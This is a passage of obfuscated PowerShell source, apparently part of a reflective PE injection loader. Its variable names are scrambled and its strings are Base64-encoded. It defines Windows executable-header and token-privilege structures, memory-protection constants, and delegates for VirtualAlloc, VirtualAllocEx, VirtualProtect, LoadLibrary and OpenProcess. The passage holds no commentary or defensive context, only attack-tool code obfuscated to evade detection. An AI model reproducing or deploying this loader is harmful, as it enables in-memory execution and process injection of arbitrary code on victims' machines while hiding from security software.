		${/=\/\_/=====\_/\_} = ${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHIAZQBzAA=='))), [UInt16[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${__/====\__/\__/==} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${___/=\/\/=====\/=} = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBDAG8AbgBzAHQA')))))
		${/=\/====\/======\} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${/=======\_/\___/\}, ${__/====\__/\__/==}, ${___/=\/\/=====\/=}, @([Int32] 4))
		${/=\/\_/=====\_/\_}.SetCustomAttribute(${/=\/====\/======\})
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AZQBtAGkAZAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AZQBtAGkAbgBmAG8A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\/===\/\_/\/=\} = ${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHIAZQBzADIA'))), [UInt16[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${__/====\__/\__/==} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${/=\/====\/======\} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${/=======\_/\___/\}, ${__/====\__/\__/==}, ${___/=\/\/=====\/=}, @([Int32] 10))
		${__/\/===\/\_/\/=\}.SetCustomAttribute(${/=\/====\/======\})
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGwAZgBhAG4AZQB3AA=='))), [Int32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_______/==\/\__/\} = ${/=\_____/\/\/=\_/}.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value ${_______/==\/\__/\}
		${/\______/====\/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${/=\_____/\/\/=\_/} = ${__/=\__/\/\/=\___}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBFAEMAVABJAE8ATgBfAEgARQBBAEQARQBSAA=='))), ${/\______/====\/=\}, [System.ValueType], 40)
		${/=\/\/\__/=\___/\} = ${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [Char[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${__/====\__/\__/==} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${/=\/====\/======\} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${/=======\_/\___/\}, ${__/====\__/\__/==}, ${___/=\/\/=====\/=}, @([Int32] 8))
		${/=\/\/\__/=\___/\}.SetCustomAttribute(${/=\/====\/======\})
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABTAGkAegBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUgBhAHcARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBhAHcARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBlAGwAbwBjAGEAdABpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATABpAG4AZQBuAHUAbQBiAGUAcgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAZQBsAG8AYwBhAHQAaQBvAG4AcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAEwAaQBuAGUAbgB1AG0AYgBlAHIAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/==\/\/===\/\_/=\} = ${/=\_____/\/\/=\_/}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value ${/==\/\/===\/\_/=\}
		${/\______/====\/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${/=\_____/\/\/=\_/} = ${__/=\__/\/\/=\___}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AQgBBAFMARQBfAFIARQBMAE8AQwBBAFQASQBPAE4A'))), ${/\______/====\/=\}, [System.ValueType], 8)
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQgBsAG8AYwBrAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/=\/\/=\/\/} = ${/=\_____/\/\/=\_/}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value ${____/\/=\/\/=\/\/}
		${/\______/====\/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${/=\_____/\/\/=\_/} = ${__/=\__/\/\/=\___}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ASQBNAFAATwBSAFQAXwBEAEUAUwBDAFIASQBQAFQATwBSAA=='))), ${/\______/====\/=\}, [System.ValueType], 20)
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAdwBhAHIAZABlAHIAQwBoAGEAaQBuAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAHIAcwB0AFQAaAB1AG4AawA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/==\_/\_/\_/===} = ${/=\_____/\/\/=\_/}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value ${__/==\_/\_/\_/===}
		${/\______/====\/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${/=\_____/\/\/=\_/} = ${__/=\__/\/\/=\___}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARQBYAFAATwBSAFQAXwBEAEkAUgBFAEMAVABPAFIAWQA='))), ${/\______/====\/=\}, [System.ValueType], 40)
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAEYAdQBuAGMAdABpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAE4AYQBtAGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARgB1AG4AYwB0AGkAbwBuAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYATgBhAG0AZQBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYATgBhAG0AZQBPAHIAZABpAG4AYQBsAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${___/==\___/\_____} = ${/=\_____/\/\/=\_/}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value ${___/==\___/\_____}
		${/\______/====\/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${/=\_____/\/\/=\_/} = ${__/=\__/\/\/=\___}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARAA='))), ${/\______/====\/=\}, [System.ValueType], 8)
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\/\_/\____/=\_/} = ${/=\_____/\/\/=\_/}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value ${/=\/\_/\____/=\_/}
		${/\______/====\/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${/=\_____/\/\/=\_/} = ${__/=\__/\/\/=\___}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARABfAEEATgBEAF8AQQBUAFQAUgBJAEIAVQBUAEUAUwA='))), ${/\______/====\/=\}, [System.ValueType], 12)
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TAB1AGkAZAA='))), ${/=\/\_/\____/=\_/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/==\/\_/=} = ${/=\_____/\/\/=\_/}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value ${/=\_____/==\/\_/=}
		${/\______/====\/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${/=\_____/\/\/=\_/} = ${__/=\__/\/\/=\___}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8AUABSAEkAVgBJAEwARQBHAEUAUwA='))), ${/\______/====\/=\}, [System.ValueType], 16)
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAQwBvAHUAbgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAcwA='))), ${/=\_____/==\/\_/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_/==\_/===\_/\} = ${/=\_____/\/\/=\_/}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value ${/=\_/==\_/===\_/\}
		return $Win32Types
	}
	Function __/===\/====\/\/\_
	{
		$Win32Constants = New-Object System.Object
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		return $Win32Constants
	}
	Function __/\/======\/==\/\
	{
		$Win32Functions = New-Object System.Object
		${/===\/\/\/==\____} = __/=======\_/=\/\/ kernel32.dll VirtualAlloc
		${___/=\__/==\__/\/} = ___/\/\/\/=\/=\/=\ @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${_/==\/\/\/\____/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/===\/\/\/==\____}, ${___/=\__/==\__/\/})
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value ${_/==\/\/\/\____/=}
		${/=\_/\_/==\_/\___} = __/=======\_/=\/\/ kernel32.dll VirtualAllocEx
		${/==\_/==\_/\_/\/=} = ___/\/\/\/=\/=\/=\ @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${__/\/=\/==\_/=\__} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\_/\_/==\_/\___}, ${/==\_/==\_/\_/\/=})
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value ${__/\/=\/==\_/=\__}
		${___/\_/\_/\___/=\} = __/=======\_/=\/\/ msvcrt.dll memcpy
		${____/==\_/\/=====} = ___/\/\/\/=\/=\/=\ @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		${__/=\__/\/\_/\__/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/\_/\_/\___/=\}, ${____/==\_/\/=====})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value ${__/=\__/\/\_/\__/}
		${_/=\_/==\_/\_/\__} = __/=======\_/=\/\/ msvcrt.dll memset
		${_/\____/====\/===} = ___/\/\/\/=\/=\/=\ @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		${__/===\_/=\_/=\__} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/=\_/==\_/\_/\__}, ${_/\____/====\/===})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value ${__/===\_/=\_/=\__}
		${/=\__/\/=\/=\/==\} = __/=======\_/=\/\/ kernel32.dll LoadLibraryA
		${/=\/=\_/\/\_/=\/=} = ___/\/\/\/=\/=\/=\ @([String]) ([IntPtr])
		${_/=\_/\/=\/====\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\__/\/=\/=\/==\}, ${/=\/=\_/\/\_/=\/=})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value ${_/=\_/\/=\/====\/}
		${__/\_____/=\/===\} = __/=======\_/=\/\/ kernel32.dll GetProcAddress
		${__/\/\___/=\_/=\/} = ___/\/\/\/=\/=\/=\ @([IntPtr], [String]) ([IntPtr])
		${_/\_/\/=====\/=\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/\_____/=\/===\}, ${__/\/\___/=\_/=\/})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value ${_/\_/\/=====\/=\/}
		${___/\/\_____/=\__} = __/=======\_/=\/\/ kernel32.dll GetProcAddress 
		${/=\__/\/==\/=\/\/} = ___/\/\/\/=\/=\/=\ @([IntPtr], [IntPtr]) ([IntPtr])
		${_/\_/===\___/\/\_} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/\/\_____/=\__}, ${/=\__/\/==\/=\/\/})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value ${_/\_/===\___/\/\_}
		${/=\_/\/\__/\_/==\} = __/=======\_/=\/\/ kernel32.dll VirtualFree
		${/=\_/\_____/\/\__} = ___/\/\/\/=\/=\/=\ @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${__/\_/====\_/\__/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\_/\/\__/\_/==\}, ${/=\_/\_____/\/\__})
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value ${__/\_/====\_/\__/}
		${/=\/==\_____/\_/\} = __/=======\_/=\/\/ kernel32.dll VirtualFreeEx
		${__/\__/\/=\_/\_/=} = ___/\/\/\/=\/=\/=\ @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${____/===\__/=\/\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\/==\_____/\_/\}, ${__/\__/\/=\_/\_/=})
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value ${____/===\__/=\/\/}
		${__/=\_/===\_/=\/=} = __/=======\_/=\/\/ kernel32.dll VirtualProtect
		${_/=\/\/\_/\/=\__/} = ___/\/\/\/=\/=\/=\ @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		${___/=\_/=\/======} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/=\_/===\_/=\/=}, ${_/=\/\/\_/\/=\__/})
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value ${___/=\_/=\/======}
		${___/\_/\_/=\/====} = __/=======\_/=\/\/ kernel32.dll GetModuleHandleA
		${_/=\__/==\_/\_/==} = ___/\/\/\/=\/=\/=\ @([String]) ([IntPtr])
		${_/\/\_/\_/\__/\_/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/\_/\_/=\/====}, ${_/=\__/==\_/\_/==})
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value ${_/\/\_/\_/\__/\_/}
		${/===\__/\/==\____} = __/=======\_/=\/\/ kernel32.dll FreeLibrary
		${_/\/\/\_/===\___/} = ___/\/\/\/=\/=\/=\ @([IntPtr]) ([Bool])
		${_/=======\/\_/\__} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/===\__/\/==\____}, ${_/\/\/\_/===\___/})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value ${_/=======\/\_/\__}
		${____/\_/=====\_/=} = __/=======\_/=\/\/ kernel32.dll OpenProcess
	    ${____/==\_____/=\/} = ___/\/\/\/=\/=\/=\ @([UInt32], [Bool], [UInt32]) ([IntPtr])
